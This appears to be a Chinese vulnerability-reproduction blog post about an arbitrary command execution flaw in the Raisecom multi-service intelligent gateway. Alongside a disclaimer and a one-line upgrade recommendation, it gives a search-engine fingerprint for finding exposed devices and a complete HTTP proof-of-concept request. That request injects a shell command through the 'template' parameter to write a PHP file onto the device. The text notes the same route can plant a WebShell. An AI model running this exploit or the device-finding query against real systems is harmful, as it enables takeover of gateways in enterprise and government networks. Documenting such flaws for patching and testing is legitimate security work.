#  瑞斯康达-多业务智能网关-任意命令执行漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-02-06 02:58  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
  
# 瑞斯康达-多业务智能网关-任意命令执行漏洞  
#   
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS2wlSogTDvFP1dZfDAicyh7uARsFpHy25GX6f9AQWibuflaibkh2oEfx3udcrOdR4r3exKDrNJ0DycGdEPRjdNL1loib4XcNv1dsP0/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
瑞斯康达多业务智能网关是面向中小企业及行业分支机构推出的综合网络接  
入解决  
方案，集数据、语  
音、安全、无线等功能于一体  
。  
瑞斯康达多业务智能网关  
广泛应用于政企  
单位、商务楼宇、校园、工业园区等场景，为企业提  
供高效、便捷、安  
全的网络接入服务  
。  
攻击者通过构造特定参数  
,利用exec  
函数直接执行  
系  
统命令。  
可写入恶意 PHP 文件（如 WebShell），获取服务器权限，进而控制整个Web 服务器，导致数据泄露、系统被控制等严重后果。  
  
04  
  
—  
  
资产测绘  
```
body="/images/raisecom/back.gif" && title=="Web user login"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS0C8Y5mHgqnjiah1ffEesWM1ibl2rlq844IibNiceEOfw9cKLnbuFwgb1HDmOLYjic8oHg3iatzOkamIeO1ghFzsNyiak6NcZa7SAicQl8/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
  
```
GET /vpn/list_base_config.php?type=mod&parts=base_config&template=`echo -e '<?php phpinfo();unlink(__FILE__);?>'>/www/tmp/test123.php`HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: think_var=..%2F..%2Fapplication%2Fdatabase; PHPSESSID=m0lgoj6m4hovmtisu1868cc8h5
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS0C6sDVGJpWdwdlxTZkyBsdMVNBv1dVJWmgLdic5OnfVarRcicB1ZXD0E60UiaIgfWZ57icpnJjvLEOEJ7k9oLNjoMozbB7KPiaOHicI/640?wx_fmt=png&from=appmsg "")  
  
在URL后面拼  
接  
路径  
/tmp/test123.php  
http://127.0.0.1/tmp/test123.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS1zcBfGkUluQM9cVDL1uxaicPII0oacakeuvFApGRHRSueTP0Nicu3VqgIw31PtcwUBYK7RGsalUEEBZdA10oNeEEBpfib0MP8KHs/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
升级到最新版本  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
